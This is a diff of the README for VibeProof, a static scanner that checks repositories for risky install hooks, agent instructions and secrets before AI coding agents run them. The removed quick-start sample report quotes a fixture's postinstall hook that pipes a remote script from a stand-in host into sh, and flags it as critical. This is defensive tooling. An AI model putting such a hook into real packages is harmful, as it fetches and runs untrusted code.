@@ -1,49 +1,32 @@
 # VibeProof
 
+[![CI](https://github.com/gogun-rgb/vibeproof/actions/workflows/ci.yml/badge.svg)](https://github.com/gogun-rgb/vibeproof/actions/workflows/ci.yml)
+![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)
+![Node.js >=22](https://img.shields.io/badge/node-%3E%3D22-339933.svg)
+
 **Scan before your AI runs it.**
 
 VibeProof is a static preflight scanner for public GitHub repositories and local folders. It helps developers and AI coding agents spot risky install hooks, agent instructions, MCP permissions, container settings, direct dependencies, and secret-like text before running repository code.
 
-VibeProof does not prove a repository is safe. It gives evidence-backed findings so a human or GPT Team Leader can decide what to inspect next.
+VibeProof does not prove a repository is safe. It gives evidence-backed findings so a human reviewer can decide what to inspect next.
 
-## 30 Second Quick Start
+## Quick Start
 
-```powershell
-npm install
-npm run build
-npm run scan -- ./fixtures/risky-postinstall
-```
-
-Expected shape:
-
-```text
-VibeProof Risk Report
-
-Verdict: BLOCK
-Risk Score: 100/100
-
-CRITICAL package.json:5 SCRIPT_REMOTE_EXEC_CRITICAL
-         "postinstall": "curl https://example.invalid/install.sh | sh"
-
-Evidence:
-- package.json:5
-
-No repository code was executed during this scan.
-```
-
-This fixture intentionally returns `BLOCK`, so the command exits with code `2`.
-
-After package publication, scan a public GitHub repository:
+After the npm package is published, use the CLI with `npx`:
 
 ```powershell
 npx vibeproof scan https://github.com/owner/repository
 ```
 
-From a source checkout, scan a local folder:
+Default scan mode is static and does not execute repository code.
 
-```powershell
-npm run scan -- ./local-project
-```
+## CLI Demo
+
+The image below is rendered from actual CLI output produced by the risky postinstall fixture.
+
+![VibeProof CLI output](docs/terminal-demo.svg)
+
+The fixture intentionally returns `BLOCK`, so the command exits with code `2`.
 
 ## CLI
 
@@ -60,7 +43,7 @@ vibeproof rules list
 vibeproof explain <rule-id>
 ```
 
-Default scan mode is `--no-ai`. Static findings, score, and verdict are deterministic. GPT explanation is separate from verified static findings and is disabled by default in v0.1.0.
+Default scan mode is `--no-ai`. Static findings, score, and verdict are deterministic. Optional GPT explanation is separate from verified static findings and is disabled by default in v0.1.0.
 
 Exit codes:
 
@@ -99,7 +82,7 @@ Every finding includes:
 TARGET_VALIDATION
 SOURCE_ACQUISITION
 FILE_DISCOVERY
-PARALLEL_STATIC_SCAN
+STATIC_SCAN
 EVIDENCE_AGGREGATION
 DETERMINISTIC_SCORING
 GPT_SECURITY_REVIEW
@@ -113,7 +96,7 @@ Monorepo layout:
 
 ```text
 apps/web               Next.js App Router UI
-packages/cli           CLI entrypoint
+packages/cli           CLI entrypoint and npm package
 packages/core          Shared types and evidence helpers
 packages/orchestrator  Scan state machine
 packages/scanners      Static scanners and source discovery
@@ -134,17 +117,19 @@ Open `http://localhost:3000`.
 
 The web UI accepts public `https://github.com/owner/repo` URLs, calls the same scan engine, shows progress stages, renders findings and evidence, and downloads JSON or Markdown reports. It does not accept arbitrary server-local paths.
 
-## Verification
+## Development
+
+Clone the repository only when you want to build or contribute locally:
 
 ```powershell
-npm run typecheck
-npm run lint
-npm run test
+git clone https://github.com/gogun-rgb/vibeproof.git
+cd vibeproof
+npm install
 npm run build
-npm run test:e2e
+npm run scan -- ./fixtures/risky-postinstall
 ```
 
-or:
+Run focused tests while developing. Before release approval, run:
 
 ```powershell
 npm run verify
